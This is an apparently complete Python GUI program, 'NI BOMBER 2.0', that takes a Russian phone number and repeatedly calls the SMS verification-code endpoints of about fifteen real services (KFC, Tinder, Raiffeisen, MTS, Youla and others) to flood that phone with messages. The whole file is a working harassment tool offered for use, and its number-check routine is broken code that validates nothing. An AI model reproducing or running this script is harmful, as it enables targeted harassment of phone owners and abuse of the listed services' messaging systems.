from tkinter import *
import requests


class Main(Frame):
    def __init__(self, root):
        super().__init__(root)

root = Tk()
app = Main(root)
app.pack()
root.title('NI BOMBER')
root.geometry("600x400")
root.configure(background = "#0C0C28")

name = Label(app, text = "NI BOMBER 2.0", bg = '#0C0C28', fg = '#14FF0A',width = 20, height = 2 )
name.pack(fill = X)


bot_window = Frame(root)
bot_window.pack()


#logic
def bomber(event):
    number = int(ent.get())
    sms = int(ent2.get())
    num = Label(root, text=int(number))
    num.pack()
    def check_number(number):
        try:
            int(len(number)) == 10
            int(number[1]) == 9
            check = Label(bot_window, text = "check number - OK")
            check.pack()
        except:
            check = Label(bot_window, text = "неправильный номер")
            check.pack()

    def attack(number, sms):
        number_7 = str(7) + str(number)
        number_plus7 = str(+7) + str(number)
        number_8 = str(8) + str(number)
        sent = 0
        while sent < sms:
            n = Label(bot_window, text = "sms отправлено - " + str(sent))
            wwork = requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": number_7, "type": 2})

            sent += 1
            n.pack()

            sun = requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': number_7})
            
            sent += 1
            n.pack()
            qlean = requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": number_7})
            
            sent += 1
            n.pack()
            cloud = requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": number_plus7, "api": 2, "email": "email","x-email": "x-email"})
            
            sent += 1
            n.pack()
            kfc = requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': number_plus7})
            
            sent += 1
            n.pack()
            utair = requests.post('https://b.utair.ru/api/v1/login/', data = {'login':number_8}, headers = {})
            
            sent += 1
            n.pack()
            tinder = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":number_7}, headers = {})
            
            sent += 1
            n.pack()
            citilink = requests.post('https://www.citilink.ru/registration/confirm/phone/+'+ number_7 +'/')
            
            sent += 1
            n.pack()
            ok = requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": number_plus7})

            sent += 1
            n.pack()
            rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': number}).json()["res"]
            
            sent += 1
            n.pack()
            karusel = requests.post('https://app.karusel.ru/api/v1/phone/', data = {"phone":number_7}, headers = {})
            
            sent += 1
            n.pack()
            youdrive = requests.post('https://youdrive.today/login/web/phone', data = {'phone': number, 'phone_code': '7'}, headers = {})
            
            sent += 1
            n.pack()
            raiffeisen = requests.get('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code', params={'number':number_7})
            
            sent += 1
            n.pack()
            mts = requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': number_7}, headers={})
            
            sent += 1
            n.pack()
            youla = requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":number_plus7}, headers = {})
    attack(number, sms)

code = Label(app, text = "номер телефона без префиксов,\nпример: 9019018801", fg = '#0CB500')
ent = Entry(app)
code.pack()
ent.pack()


code2 = Label(app, text = "сколько sms отправить?", fg = '#0CB500')
ent2 = Entry(app)
code2.pack()
ent2.pack()


start =  Button(text='BOMB!', font = 35, fg = '#0CB500', bg = '#0C0C28', width = 20, height = 2)
start.pack()

start.bind("<Button-1>", bomber)
telegram = Label(bot_window, text = "coded by nikait\t   \ntelegram: @aaanikit", bg = '#0C0C28', fg = '#D10A62')
telegram.pack(side = BOTTOM)
root.mainloop()
